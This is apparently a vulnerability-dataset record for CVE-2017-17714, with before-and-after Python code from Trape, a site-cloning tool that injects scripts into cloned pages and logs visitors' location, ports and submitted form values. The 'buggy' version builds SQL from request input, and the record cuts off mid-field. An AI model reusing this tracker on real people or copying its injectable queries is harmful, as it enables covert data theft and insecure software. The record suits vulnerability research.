{"buggy_code": ["#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#**\n#\n#########\n# trape #\n#########\n#\n# trape depends of this file\n# For full copyright information this visit: https://github.com/boxug/trape\n#\n# Copyright 2017 by boxug / <hey@boxug.com>\n#**\nimport sqlite3\n\nclass Database(object):\n    def __init__(self):     \n        self.conn = sqlite3.connect(\"database.db\", check_same_thread=False)\n        self.cursor = self.conn.cursor()\n        \n    def loadDatabase(self):\n        self.cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS \"geo\" ( `id` TEXT, `city` TEXT, `country_code` TEXT, `country_name` TEXT, `ip` TEXT, `latitude` TEXT, `longitude` TEXT, `metro_code` TEXT, `region_code` TEXT, `region_name` TEXT, `time_zone` TEXT, `zip_code` TEXT, `isp` TEXT, `ua` TEXT, PRIMARY KEY(`id`) )\"\"\")\n        self.cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS \"networks\" ( `id` TEXT, `ip` TEXT, `public_ip` INTEGER, `network` TEXT, `date` TEXT )\"\"\")\n        self.cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS \"requests\" ( `id` TEXT, `user_id` TEXT, `site` TEXT, `fid` TEXT, `name` TEXT, `value` TEXT, `date` TEXT )\"\"\")\n        self.cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS \"victims\" ( `id` TEXT, `ip` TEXT, `date` TEXT, `time` REAL, `bVersion` TEXT, `browser` TEXT, `device` TEXT, `cpu` TEXT, `ports` TEXT, `status`  TEXT )\"\"\")\n        self.cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS \"clicks\" ( `id` TEXT, `site` TEXT, `date` TEXT )\"\"\")\n        self.conn.commit()\n        return True\n\n    def sql_execute(self, sentence):\n        self.cursor.execute(sentence)\n        return self.cursor.fetchall()\n\n    def sql_one_row(self, sentence, column):\n        self.cursor.execute(sentence)\n        return self.cursor.fetchone()[column]\n\n    def sql_insert(self, sentence):\n        self.cursor.execute(sentence)\n        self.conn.commit()\n        return True\n\n    def prop_sentences_stats(self, type, vId = None):\n        return {\n            'get_data' : \"SELECT victims.*, geo.*, victims.ip AS ip_local, COUNT(clicks.id) FROM victims INNER JOIN geo ON victims.id = geo.id LEFT JOIN clicks ON clicks.id = victims.id GROUP BY victims.id ORDER BY victims.time DESC\",\n            'all_networks' : \"SELECT networks.* FROM networks ORDER BY id\",\n            'get_preview' : \"SELECT victims.*, geo.*, victims.ip AS ip_local FROM victims INNER JOIN geo ON victims.id = geo.id WHERE victims.id = '%s'\" % (vId),\n            'id_networks' : \"SELECT networks.* FROM networks WHERE id = '%s'\" % (vId),\n            'get_requests' : \"SELECT requests.*, geo.ip FROM requests INNER JOIN geo on geo.id = requests.user_id ORDER BY requests.date DESC, requests.id \",\n            'get_sessions' : \"SELECT COUNT(*) AS Total FROM networks\",\n            'get_clicks' : \"SELECT COUNT(*) AS Total FROM clicks\",\n            'get_online' : \"SELECT COUNT(*) AS Total FROM victims WHERE status = '%s'\" % ('online')\n        }.get(type, False)\n\n    def sentences_stats(self, type, vId = None):\n        return self.sql_execute(self.prop_sentences_stats(type, vId))\n\n    def prop_sentences_victim(self, type, data = None):\n        if type == 'count_victim':\n            return \"SELECT COUNT(*) AS C FROM victims WHERE id = '%s'\" % (data)\n        elif type == 'count_times':\n            return \"SELECT COUNT(*) AS C FROM clicks WHERE id = '%s'\" % (data)\n        elif type == 'update_victim':\n            return \"UPDATE victims SET ip = '%s', date = '%s', bVersion = '%s', browser = '%s', device = '%s', ports = '%s', time = '%s', cpu = '%s', status = '%s' WHERE id = '%s'\" % (data[0].ip, data[0].date, data[0].version, data[0].browser, data[0].device, data[0].ports, data[2], data[0].cpu, 'online', data[1])\n        elif type == 'update_victim_geo':\n            return \"UPDATE geo SET city = '%s', country_code = '%s', country_name = '%s', ip = '%s', latitude = '%s', longitude = '%s', metro_code = '%s', region_code = '%s', region_name = '%s', time_zone = '%s', zip_code = '%s', isp = '%s', ua='%s' WHERE id = '%s'\" % (data[0].city, data[0].country_code, data[0].country_name, data[0].ip, data[0].latitude, data[0].longitude, data[0].metro_code, data[0].region_code, data[0].region_name, data[0].time_zone, data[0].zip_code, data[0].isp, data[0].ua, data[1])\n        elif type == 'insert_victim':\n            return \"INSERT INTO victims(id, ip, date, bVersion, browser, device, ports, time, cpu, status) VALUES('%s','%s', '%s','%s', '%s','%s', '%s', '%s', '%s', '%s')\" % (data[1], data[0].ip, data[0].date, data[0].version, data[0].browser, data[0].device, data[0].ports, data[2], data[0].cpu, 'online')\n        elif type == 'insert_victim_geo':\n            return \"INSERT INTO geo(id, city, country_code, country_name, ip, latitude, longitude, metro_code, region_code, region_name, time_zone, zip_code, isp, ua) VALUES('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')\"  % (data[1], data[0].city, data[0].country_code, data[0].country_name, data[0].ip, data[0].latitude, data[0].longitude, data[0].metro_code, data[0].region_code, data[0].region_name, data[0].time_zone, data[0].zip_code, data[0].isp, data[0].ua)\n        elif type == 'count_victim_network':\n            return \"SELECT COUNT(*) AS C FROM networks WHERE id = '%s' AND network = '%s'\" % (data[0], data[1])\n        elif type == 'delete_networks':\n            return \"DELETE FROM networks WHERE id = '%s'\" % (data[0])\n        elif type == 'update_network':\n            return \"UPDATE networks SET date = '%s' WHERE id = '%s' AND network = '%s'\" % (data[2], data[0], data[1])\n        elif type == 'insert_networks':\n            return \"INSERT INTO networks(id, public_ip, ip, network, date) VALUES('%s','%s', '%s', '%s','%s')\" % (data[0], data[1], data[2], data[3], data[4])\n        elif type == 'insert_requests':\n            return \"INSERT INTO requests(id, user_id, site, fid, name, value, date) VALUES('%s', '%s','%s', '%s', '%s','%s', '%s')\" % (data[0].sId, data[0].id, data[0].site, data[0].fid, data[0].name, data[0].value, data[1])\n        elif type == 'insert_click':\n            return \"INSERT INTO clicks(id, site, date) VALUES('%s', '%s','%s')\" % (data[0], data[1], data[2])\n        elif type == 'report_online':\n            return \"UPDATE victims SET status = '%s' WHERE id = '%s'\" % ('online', data[0])\n        elif type == 'clean_online':\n            return \"UPDATE victims SET status = '%s' \" % ('offline')\n        elif type == 'disconnect_victim':\n            return \"UPDATE victims SET status = '%s' WHERE id = '%s'\" % ('offline', data)\n        else:\n            return False\n\n    def sentences_victim(self, type, data = None, sRun = 1, column = 0):\n        if sRun == 2:\n            return self.sql_insert(self.prop_sentences_victim(type, data))\n        elif sRun == 3:\n            return self.sql_one_row(self.prop_sentences_victim(type, data), column)\n        else:\n            return self.sql_execute(self.prop_sentences_victim(type, data))\n\n    def __del__(self):\n        self.conn.close()", "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#**\n#\n#########\n# trape #\n#########\n#\n# trape depends of this file\n# For full copyright information this visit: https://github.com/boxug/trape\n#\n# Copyright 2017 by boxug / <hey@boxug.com>\n#**\nimport urllib2\nfrom flask import Flask, render_template, session, request, json\nfrom core.trape import Trape\nfrom core.db import Database\n\n# Main parts, to generate relationships among others\ntrape = Trape()\napp = Flask(__name__, template_folder='../templates', static_folder='../static')\n\n# call database\ndb = Database()\n\n# preview header tool in console\ntrape.header()\n\n@app.route(\"/\" + trape.stats_path)\ndef index():\n    return render_template(\"/login.html\")\n\n@app.route(\"/logout\")\ndef logout():\n    return render_template(\"/login.html\")\n\n@app.route(\"/login\", methods=[\"POST\"])\ndef login():\n    id = request.form['id']\n    if id == trape.stats_key:\n        return json.dumps({'status':'OK', 'path' : trape.home_path, 'victim_path' : trape.victim_path, 'url_to_clone' : trape.url_to_clone, 'app_port' : trape.app_port, 'date_start' : trape.date_start, 'user_ip' : '127.0.0.1'});\n    else:\n      return json.dumps({'status':'NOPE', 'path' : '/'});\n\n@app.route(\"/get_data\", methods=[\"POST\"])\ndef home_get_dat():\n    d = db.sentences_stats('get_data')\n    n = db.sentences_stats('all_networks')\n\n    ('clean_online')\n    rows = db.sentences_stats('get_clicks')\n    c = rows[0][0]\n    rows = db.sentences_stats('get_sessions')\n    s = rows[0][0]\n    rows = db.sentences_stats('get_online')\n    o = rows[0][0]\n\n    return json.dumps({'status' : 'OK', 'd' : d, 'n' : n, 'c' : c, 's' : s, 'o' : o});\n\n@app.route(\"/get_preview\", methods=[\"POST\"])\ndef home_get_preview():\n    vId = request.form['vId']\n    d = db.sentences_stats('get_preview', vId)\n    n = db.sentences_stats('id_networks', vId)\n    return json.dumps({'status' : 'OK', 'vId' : vId, 'd' : d, 'n' : n});\n\n@app.route(\"/get_title\", methods=[\"POST\"])\ndef home_get_title():\n    opener = urllib2.build_opener()\n    html = opener.open(trape.url_to_clone).read()\n    html = html[html.find('<title>') + 7 : html.find('</title>')]\n    return json.dumps({'status' : 'OK', 'title' : html});\n\n@app.route(\"/get_requests\", methods=[\"POST\"])\ndef home_get_requests():\n    d = db.sentences_stats('get_requests')\n\n    return json.dumps({'status' : 'OK', 'd' : d});", "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#**\n#\n#########\n# trape #\n#########\n#\n# trape depends of this file\n# For full copyright information this visit: https://github.com/boxug/trape\n#\n# Copyright 2017 by boxug / <hey@boxug.com>\n#**\nimport time\nimport urllib2\nfrom flask import Flask, render_template, session, request, json\nfrom core.victim_objects import *\nimport core.stats\nfrom core.utils import utils\nfrom core.db import Database\n\n\n# Main parts, to generate relationships among others\ntrape = core.stats.trape\napp = core.stats.app\n\n# call database\ndb = Database()\n\nclass victim_server(object):\n    @app.route(\"/\" + trape.victim_path)\n    def homeVictim():\n        opener = urllib2.build_opener()\n        headers = victim_headers()\n        opener.addheaders = headers\n        html = victim_inject_code(opener.open(trape.url_to_clone).read(), 'lure')\n        return html\n\n    @app.route(\"/register\", methods=[\"POST\"])\n    def register():\n        vId = request.form['vId']\n        if vId == '':\n          vId = utils.generateToken(5)\n\n        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], request.user_agent.platform, request.user_agent.browser, request.user_agent.version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime(\"%Y-%m-%d - %H:%M:%S\"))\n        victimGeo = victim_geo(vId, 'city', request.form['countryCode'], request.form['country'], request.form['query'], request.form['lat'], request.form['lon'], request.form['org'], request.form['region'], request.form['regionName'], request.form['timezone'], request.form['zip'], request.form['isp'], str(request.user_agent))\n\n        utils.Go(utils.Color['white'] + \"[\" + utils.Color['blueBold'] + \"*\" + utils.Color['white'] + \"]\" + \" A victim has been connected from \" + utils.Color['blue'] + victimGeo.ip + utils.Color['white'] + ' with the following identifier: ' + utils.Color['green'] + vId + utils.Color['white'])\n        cant = int(db.sentences_victim('count_times', vId, 3, 0))\n\n        db.sentences_victim('insert_click', [vId, trape.url_to_clone, time.strftime(\"%Y-%m-%d - %H:%M:%S\")], 2)\n        db.sentences_victim('delete_networks', [vId], 2)\n\n        if cant > 0:\n            utils.Go(utils.Color['white'] + \"[\" + utils.Color['blueBold'] + \"*\" + utils.Color['white'] + \"]\" + \" \" + \"It\\'s his \" + str(cant + 1) + \" time\")\n            db.sentences_victim('update_victim', [victimConnect, vId, time.time()], 2)\n            db.sentences_victim('update_victim_geo', [victimGeo, vId], 2)\n        else:\n            utils.Go(utils.Color['white'] + \"[\" + utils.Color['blueBold'] + \"*\" + utils.Color['white'] + \"]\" + \" \" + \"It\\'s his first time\")\n            db.sentences_victim('insert_victim', [victimConnect, vId, time.time()], 2)\n            db.sentences_victim('insert_victim_geo', [victimGeo, vId], 2)\n        return json.dumps({'status' : 'OK', 'vId' : vId});\n\n    @app.route(\"/nr\", methods=[\"POST\"])\n    def networkRegister():\n        vId = request.form['vId']\n        vIp = request.form['ip']\n        vnetwork = request.form['red']\n        if vId == '':\n          vId = utils.generateToken(5)\n        utils.Go(utils.Color['white'] + \"[\" + utils.Color['greenBold'] + \"+\" + utils.Color['white'] + \"]\" + utils.Color['whiteBold'] + \" \" + vnetwork + utils.Color['white'] + \" session detected from \" + utils.Color['blue'] + vIp + utils.Color['white'] + ' ' + \"with ID: \" + utils.Color['green'] + vId + utils.Color['white'])\n\n        cant = int(db.sentences_victim('count_victim_network', [vId, vnetwork], 3, 0))\n\n        if cant > 0:\n            db.sentences_victim('update_network', [vId, vnetwork, time.strftime(\"%Y-%m-%d - %H:%M:%S\")], 2)\n        else:\n            db.sentences_victim('insert_networks', [vId, vIp, request.environ['REMOTE_ADDR'], vnetwork, time.strftime(\"%Y-%m-%d - %H:%M:%S\")], 2)\n        return json.dumps({'status' : 'OK', 'vId' : vId});\n\n    @app.route(\"/redv\")\n    def redirectVictim():\n        url = request.args.get('url')\n        opener = urllib2.build_opener()\n        headers = victim_headers()\n        opener.addheaders = headers\n        html = victim_inject_code(opener.open(url).read(), 'vscript')\n        return html\n\n    @app.route(\"/regv\", methods=[\"POST\"])\n    def registerRequest():\n        vrequest = victim_request(request.form['vId'], request.form['site'], request.form['fid'], request.form['name'], request.form['value'], request.form['sId'])\n        db.sentences_victim('insert_requests', [vrequest, time.strftime(\"%Y-%m-%d - %H:%M:%S\")], 2)\n        utils.Go(utils.Color['white'] + \"[\" + utils.Color['greenBold'] + \"=\" + utils.Color['white'] + \"]\" + \" \" + 'Receiving data from: ' + utils.Color['green'] + vrequest.id + utils.Color['white']  + ' ' + 'on' + ' ' + utils.Color['blue'] + vrequest.site + utils.Color['white'] + '\\t\\n' + vrequest.fid + '\\t' + vrequest.name + ':\\t' + vrequest.value)\n        return json.dumps({'status' : 'OK', 'vId' : vrequest.id});\n\n    @app.route(\"/tping\", methods=[\"POST\"])\n    def receivePing():\n        vrequest = request.form['id']\n        db.sentences_victim('report_online', [vrequest])\n        return json.dumps({'status' : 'OK', 'vId' : vrequest});\n"], "fixing_code": ["#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#**\n#\n#########\n# trape #\n#########\n#\n# trape depends of this file\n# For full copyright information this visit: https://github.com/boxug/trape\n#\n# Copyright 2017 by boxug / <hey@boxug.com>\n#**\nimport sqlite3\n\nclass Database(object):\n    def __init__(self):     \n        self.conn = sqlite3.connect(\"database.db\", check_same_thread=False)\n        self.cursor = self.conn.cursor()\n        \n    def loadDatabase(self):\n        self.cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS \"geo\" ( `id` TEXT, `city` TEXT, `country_code` TEXT, `country_name` TEXT, `ip` TEXT, `latitude` TEXT, `longitude` TEXT, `metro_code` TEXT, `region_code` TEXT, `region_name` TEXT, `time_zone` TEXT, `zip_code` TEXT, `isp` TEXT, `ua` TEXT, PRIMARY KEY(`id`) )\"\"\")\n        self.cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS \"networks\" ( `id` TEXT, `ip` TEXT, `public_ip` INTEGER, `network` TEXT, `date` TEXT )\"\"\")\n        self.cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS \"requests\" ( `id` TEXT, `user_id` TEXT, `site` TEXT, `fid` TEXT, `name` TEXT, `value` TEXT, `date` TEXT )\"\"\")\n        self.cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS \"victims\" ( `id` TEXT, `ip` TEXT, `date` TEXT, `time` REAL, `bVersion` TEXT, `browser` TEXT, `device` TEXT, `cpu` TEXT, `ports` TEXT, `status`  TEXT )\"\"\")\n        self.cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS \"clicks\" ( `id` TEXT, `site` TEXT, `date` TEXT )\"\"\")\n        self.conn.commit()\n        return True\n\n    def sql_execute(self, sentence):\n    \tif type(sentence) is str:\n        \tself.cursor.execute(sentence)\n    \telse:\n        \tself.cursor.execute(sentence[0], sentence[1])\n        return self.cursor.fetchall()\n\n    def sql_one_row(self, sentence, column):\n        if type(sentence) is str:\n        \tself.cursor.execute(sentence)\n    \telse:\n        \tself.cursor.execute(sentence[0], sentence[1])\t\n        return self.cursor.fetchone()[column]\n\n    def sql_insert(self, sentence):\n        if type(sentence) is str:\n        \tself.cursor.execute(sentence)\n    \telse:\n        \tself.cursor.execute(sentence[0], sentence[1])\n        self.conn.commit()\n        return True\n\n    def prop_sentences_stats(self, type, vId = None):\n        return {\n        \t'get_data' : \"SELECT victims.*, geo.*, victims.ip AS ip_local, COUNT(clicks.id) FROM victims INNER JOIN geo ON victims.id = geo.id LEFT JOIN clicks ON clicks.id = victims.id GROUP BY victims.id ORDER BY victims.time DESC\",\n        \t'all_networks' : \"SELECT networks.* FROM networks ORDER BY id\",\n        \t'get_preview' : (\"SELECT victims.*, geo.*, victims.ip AS ip_local FROM victims INNER JOIN geo ON victims.id = geo.id WHERE victims.id = ?\" , vId),\n        \t'id_networks' : (\"SELECT networks.* FROM networks WHERE id = ?\", vId),\n        \t'get_requests' : \"SELECT requests.*, geo.ip FROM requests INNER JOIN geo on geo.id = requests.user_id ORDER BY requests.date DESC, requests.id \",\n        \t'get_sessions' : \"SELECT COUNT(*) AS Total FROM networks\",\n        \t'get_clicks' : \"SELECT COUNT(*) AS Total FROM clicks\",\n        \t'get_online' : (\"SELECT COUNT(*) AS Total FROM victims WHERE status = ?\", vId)\n        }.get(type, False)\n\n    def sentences_stats(self, type, vId = None):\n    \treturn self.sql_execute(self.prop_sentences_stats(type, vId))\n\n    def prop_sentences_victim(self, type, data = None):\n        if type == 'count_victim':\n        \tt = (data,)\n        \treturn (\"SELECT COUNT(*) AS C FROM victims WHERE id = ?\" , t)\n        elif type == 'count_times':\n        \tt = (data,)\n        \treturn (\"SELECT COUNT(*) AS C FROM clicks WHERE id = ?\" , t)\n        elif type == 'update_victim':\n        \tt = (data[0].ip, data[0].date, data[0].version, data[0].browser, data[0].device, data[0].ports, data[2], data[0].cpu, 'online', data[1],)\n        \treturn (\"UPDATE victims SET ip = ?, date = ?, bVersion = ?, browser = ?, device = ?, ports = ?, time = ?, cpu = ?, status = ? WHERE id = ?\", t)\n        elif type == 'update_victim_geo':\n        \tt = (data[0].city, data[0].country_code, data[0].country_name, data[0].ip, data[0].latitude, data[0].longitude, data[0].metro_code, data[0].region_code, data[0].region_name, data[0].time_zone, data[0].zip_code, data[0].isp, data[0].ua, data[1],)\n        \treturn (\"UPDATE geo SET city = ?, country_code = ?, country_name = ?, ip = ?, latitude = ?, longitude = ?, metro_code = ?, region_code = ?, region_name = ?, time_zone = ?, zip_code = ?, isp = ?, ua=? WHERE id = ?\", t)\n        elif type == 'insert_victim':\n        \tt = (data[1], data[0].ip, data[0].date, data[0].version, data[0].browser, data[0].device, data[0].ports, data[2], data[0].cpu, 'online',)\n        \treturn (\"INSERT INTO victims(id, ip, date, bVersion, browser, device, ports, time, cpu, status) VALUES(?,?, ?,?, ?,?, ?, ?, ?, ?)\", t)\n        elif type == 'insert_victim_geo':\n        \tt = (data[1], data[0].city, data[0].country_code, data[0].country_name, data[0].ip, data[0].latitude, data[0].longitude, data[0].metro_code, data[0].region_code, data[0].region_name, data[0].time_zone, data[0].zip_code, data[0].isp, data[0].ua,)\n        \treturn (\"INSERT INTO geo(id, city, country_code, country_name, ip, latitude, longitude, metro_code, region_code, region_name, time_zone, zip_code, isp, ua) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\" , t)\n        elif type == 'count_victim_network':\n        \treturn (\"SELECT COUNT(*) AS C FROM networks WHERE id = ? AND network = ?\", (data[0], data[1],))\n        elif type == 'delete_networks':\n        \treturn (\"DELETE FROM networks WHERE id = ?\", (data[0],))\n        elif type == 'update_network':\n        \treturn (\"UPDATE networks SET date = ? WHERE id = ? AND network = ?\" , (data[2], data[0], data[1],))\n        elif type == 'insert_networks':\n        \tt = (data[0], data[1], data[2], data[3], data[4],)\n        \treturn (\"INSERT INTO networks(id, public_ip, ip, network, date) VALUES(?,?, ?, ?,?)\" , t)\n        elif type == 'insert_requests':\n        \tt = (data[0].sId, data[0].id, data[0].site, data[0].fid, data[0].name, data[0].value, data[1],)\n        \treturn (\"INSERT INTO requests(id, user_id, site, fid, name, value, date) VALUES(?, ?,?, ?, ?,?, ?)\" , t)\n        elif type == 'insert_click':\n        \treturn (\"INSERT INTO clicks(id, site, date) VALUES(?, ?,?)\", (data[0], data[1], data[2],))\n        elif type == 'report_online':\n        \treturn (\"UPDATE victims SET status = ? WHERE id = ?\" , ('online', data[0],))\n        elif type == 'clean_online':\n        \treturn (\"UPDATE victims SET status = ? \", ('offline',))\n        elif type == 'disconnect_victim':\n        \treturn (\"UPDATE victims SET status = ? WHERE id = ?\" , ('offline', data,))\n        else:\n        \treturn False\n\n    def sentences_victim(self, type, data = None, sRun = 1, column = 0):\n        if sRun == 2:\n        \treturn self.sql_insert(self.prop_sentences_victim(type, data))\n        elif sRun == 3:\n        \treturn self.sql_one_row(self.prop_sentences_victim(type, data), column)\n        else:\n        \treturn self.sql_execute(self.prop_sentences_victim(type, data))\n\n    def __del__(self):\n        self.conn.close()", "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#**\n#\n#########\n# trape #\n#########\n#\n# trape depends of this file\n# For full copyright information this visit: https://github.com/boxug/trape\n#\n# Copyright 2017 by boxug / <hey@boxug.com>\n#**\nimport urllib2\nfrom flask import Flask, render_template, session, request, json\nfrom core.trape import Trape\nfrom core.db import Database\n\n# Main parts, to generate relationships among others\ntrape = Trape()\napp = Flask(__name__, template_folder='../templates', static_folder='../static')\n\n# call database\ndb = Database()\n\n# preview header tool in console\ntrape.header()\n\n@app.route(\"/\" + trape.stats_path)\ndef index():\n    return render_template(\"/login.html\")\n\n@app.route(\"/logout\")\ndef logout():\n    return render_template(\"/login.html\")\n\n@app.route(\"/login\", methods=[\"POST\"])\ndef login():\n    id = request.form['id']\n    if id == trape.stats_key:\n        return json.dumps({'status':'OK', 'path' : trape.home_path, 'victim_path' : trape.victim_path, 'url_to_clone' : trape.url_to_clone, 'app_port' : trape.app_port, 'date_start' : trape.date_start, 'user_ip' : '127.0.0.1'});\n    else:\n      return json.dumps({'status':'NOPE', 'path' : '/'});\n\n@app.route(\"/get_data\", methods=[\"POST\"])\ndef home_get_dat():\n    d = db.sentences_stats('get_data')\n    n = db.sentences_stats('all_networks')\n\n    rows = db.sentences_stats('get_clicks')\n    c = rows[0][0]\n    rows = db.sentences_stats('get_sessions')\n    s = rows[0][0]\n    vId = ('online', )\n    rows = db.sentences_stats('get_online', vId)\n    o = rows[0][0]\n\n    return json.dumps({'status' : 'OK', 'd' : d, 'n' : n, 'c' : c, 's' : s, 'o' : o});\n\n@app.route(\"/get_preview\", methods=[\"POST\"])\ndef home_get_preview():\n    vId = request.form['vId']\n    t = (vId,)\n    d = db.sentences_stats('get_preview', t)\n    n = db.sentences_stats('id_networks', t)\n    return json.dumps({'status' : 'OK', 'vId' : vId, 'd' : d, 'n' : n});\n\n@app.route(\"/get_title\", methods=[\"POST\"])\ndef home_get_title():\n    opener = urllib2.build_opener()\n    html = opener.open(trape.url_to_clone).read()\n    html = html[html.find('<title>') + 7 : html.find('</title>')]\n    return json.dumps({'status' : 'OK', 'title' : html});\n\n@app.route(\"/get_requests\", methods=[\"POST\"])\ndef home_get_requests():\n    d = db.sentences_stats('get_requests')\n\n    return json.dumps({'status' : 'OK', 'd' : d});", "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#**\n#\n#########\n# trape #\n#########\n#\n# trape depends of this file\n# For full copyright information this visit: https://github.com/boxug/trape\n#\n# Copyright 2017 by boxug / <hey@boxug.com>\n#**\nimport time\nimport urllib2\nfrom flask import Flask, render_template, session, request, json\nfrom core.victim_objects import *\nimport core.stats\nfrom core.utils import utils\nfrom core.db import Database\n\n\n# Main parts, to generate relationships among others\ntrape = core.stats.trape\napp = core.stats.app\n\n# call database\ndb = Database()\n\nclass victim_server(object):\n    @app.route(\"/\" + trape.victim_path)\n    def homeVictim():\n        opener = urllib2.build_opener()\n        headers = victim_headers()\n        opener.addheaders = headers\n        html = victim_inject_code(opener.open(trape.url_to_clone).read(), 'lure')\n        return html\n\n    @app.route(\"/register\", methods=[\"POST\"])\n    def register():\n        vId = request.form['vId']\n        if vId == '':\n          vId = utils.generateToken(5)\n\n        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], request.user_agent.platform, request.user_agent.browser, request.user_agent.version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime(\"%Y-%m-%d - %H:%M:%S\"))\n        victimGeo = victim_geo(vId, 'city', request.form['countryCode'], request.form['country'], request.form['query'], request.form['lat'], request.form['lon'], request.form['org'], request.form['region'], request.form['regionName'], request.form['timezone'], request.form['zip'], request.form['isp'], str(request.user_agent))\n\n        utils.Go(utils.Color['white'] + \"[\" + utils.Color['blueBold'] + \"*\" + utils.Color['white'] + \"]\" + \" A victim has been connected from \" + utils.Color['blue'] + victimGeo.ip + utils.Color['white'] + ' with the following identifier: ' + utils.Color['green'] + vId + utils.Color['white'])\n        cant = int(db.sentences_victim('count_times', vId, 3, 0))\n\n        db.sentences_victim('insert_click', [vId, trape.url_to_clone, time.strftime(\"%Y-%m-%d - %H:%M:%S\")], 2)\n        db.sentences_victim('delete_networks', [vId], 2)\n\n        if cant > 0:\n            utils.Go(utils.Color['white'] + \"[\" + utils.Color['blueBold'] + \"*\" + utils.Color['white'] + \"]\" + \" \" + \"It\\'s his \" + str(cant + 1) + \" time\")\n            db.sentences_victim('update_victim', [victimConnect, vId, time.time()], 2)\n            db.sentences_victim('update_victim_geo', [victimGeo, vId], 2)\n        else:\n            utils.Go(utils.Color['white'] + \"[\" + utils.Color['blueBold'] + \"*\" + utils.Color['white'] + \"]\" + \" \" + \"It\\'s his first time\")\n            db.sentences_victim('insert_victim', [victimConnect, vId, time.time()], 2)\n            db.sentences_victim('insert_victim_geo', [victimGeo, vId], 2)\n        return json.dumps({'status' : 'OK', 'vId' : vId});\n\n    @app.route(\"/nr\", methods=[\"POST\"])\n    def networkRegister():\n        vId = request.form['vId']\n        vIp = request.form['ip']\n        vnetwork = request.form['red']\n        if vId == '':\n          vId = utils.generateToken(5)\n        utils.Go(utils.Color['white'] + \"[\" + utils.Color['greenBold'] + \"+\" + utils.Color['white'] + \"]\" + utils.Color['whiteBold'] + \" \" + vnetwork + utils.Color['white'] + \" session detected from \" + utils.Color['blue'] + vIp + utils.Color['white'] + ' ' + \"with ID: \" + utils.Color['green'] + vId + utils.Color['white'])\n\n        cant = int(db.sentences_victim('count_victim_network', [vId, vnetwork], 3, 0))\n\n        if cant > 0:\n            db.sentences_victim('update_network', [vId, vnetwork, time.strftime(\"%Y-%m-%d - %H:%M:%S\")], 2)\n        else:\n            db.sentences_victim('insert_networks', [vId, vIp, request.environ['REMOTE_ADDR'], vnetwork, time.strftime(\"%Y-%m-%d - %H:%M:%S\")], 2)\n        return json.dumps({'status' : 'OK', 'vId' : vId});\n\n    @app.route(\"/redv\")\n    def redirectVictim():\n        url = request.args.get('url')\n        opener = urllib2.build_opener()\n        headers = victim_headers()\n        opener.addheaders = headers\n        html = victim_inject_code(opener.open(url).read(), 'vscript')\n        return html\n\n    @app.route(\"/regv\", methods=[\"POST\"])\n    def registerRequest():\n        vrequest = victim_request(request.form['vId'], request.form['site'], request.form['fid'], request.form['name'], request.form['value'], request.form['sId'])\n        db.sentences_victim('insert_requests', [vrequest, time.strftime(\"%Y-%m-%d - %H:%M:%S\")], 2)\n        utils.Go(utils.Color['white'] + \"[\" + utils.Color['greenBold'] + \"=\" + utils.Color['white'] + \"]\" + \" \" + 'Receiving data from: ' + utils.Color['green'] + vrequest.id + utils.Color['white']  + ' ' + 'on' + ' ' + utils.Color['blue'] + vrequest.site + utils.Color['white'] + '\\t\\n' + vrequest.fid + '\\t' + vrequest.name + ':\\t' + vrequest.value)\n        return json.dumps({'status' : 'OK', 'vId' : vrequest.id});\n\n    @app.route(\"/tping\", methods=[\"POST\"])\n    def receivePing():\n        vrequest = request.form['id']\n        db.sentences_victim('report_online', [vrequest], 2)\n        return json.dumps({'status' : 'OK', 'vId' : vrequest});\n"], "filenames": ["core/db.py", "core/stats.py", "core/victim.py"], "buggy_code_start_loc": [31, 50, 100], "buggy_code_end_loc": [99, 65, 101], "fixing_code_start_loc": [31, 49, 100], "fixing_code_end_loc": [116, 66, 101], "type": "CWE-79", "message": "Trape before 2017-11-05 has XSS via the /nr red parameter, the /nr vId parameter, the /register User-Agent HTTP header, the /register country parameter, the /register countryCode parameter, the /register cpu parameter, the /register isp parameter, the /register lat parameter, the /register lon parameter, the /register org parameter, the /register query parameter, the /register region parameter, the /register regionName parameter, the /register timezone parameter, the /register vId parameter, the /register zip parameter, or the /tping id parameter.", "other": {"cve": {"id": "CVE-2017-17714", "sourceIdentifier": "cve@mitre.org", "published": "2017-12-16T20:29:00.263", "lastModified": "2018-01-04T15:23:20.687", "vulnStatus": "Analyzed", "descriptions": [{"lang": "en", "value": "Trape before 2017-11-05 has XSS via the /nr red parameter, the /nr vId parameter, the /register User-Agent HTTP header, the /register country parameter, the /register countryCode parameter, the /register cpu parameter, the /register isp parameter, the /register lat parameter, the /register lon parameter, the /register org parameter, the /register query parameter, the /register region parameter, the /register regionName parameter, the /register timezone parameter, the /register vId parameter, the /register zip parameter, or the /tping id parameter."}, {"lang": "es", "value": "Trape en versiones anteriores a 2017-11-05 tiene una vulnerabilidad de Cross-Site Scripting (XSS) mediante el par\u00e1metro red en /nr , el par\u00e1metro vld en /nr, la cabecera HTTP User-Agent en /register, el par\u00e1metro country en /register , el par\u00e1metro countryCode en /register , el par\u00e1metro cpu en /register, el par\u00e1metro isp en /register , el par\u00e1metro lat en /register, el par\u00e1metro lon en /register , el par\u00e1metro org en /register, el par\u00e1metro query en /register, el par\u00e1metro region en /register, el par\u00e1metro regionName en /register, el par\u00e1metro timezone en /register, el par\u00e1metro vId en /register, el par\u00e1metro zip en /register o el par\u00e1metro id en /tping."}], "metrics": {"cvssMetricV30": 